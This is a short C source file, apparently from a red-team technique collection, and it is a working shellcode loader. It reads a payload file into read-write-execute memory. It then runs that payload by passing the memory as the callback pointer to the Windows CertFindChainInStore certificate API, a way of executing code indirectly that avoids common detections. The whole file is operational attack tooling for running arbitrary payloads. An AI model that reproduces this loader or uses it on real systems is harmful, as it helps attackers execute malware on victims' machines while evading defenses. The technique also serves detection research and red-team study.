// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "Crypt32.lib")

#include <stdio.h>
#include <windows.h>
#include <wincrypt.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	HCERTSTORE hCertStore = NULL;
	CERT_CHAIN_FIND_ISSUER_PARA sCCFIP = { 0 };

	if (argc != 2)
	{
		printf("Usage: CertFindChainInStore.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);

	hCertStore = CertOpenStore(CERT_STORE_PROV_SYSTEM, 0, NULL, CERT_SYSTEM_STORE_CURRENT_USER, L"My");

	sCCFIP.pfnFindCallback = (PFN_CERT_CHAIN_FIND_BY_ISSUER_CALLBACK)hAlloc;
	sCCFIP.cbSize = sizeof(CERT_CHAIN_FIND_ISSUER_PARA);

	CertFindChainInStore(hCertStore, X509_ASN_ENCODING, 0, CERT_CHAIN_FIND_BY_ISSUER, &sCCFIP, NULL);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	if (hCertStore)
		CertCloseStore(hCertStore, 0);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}
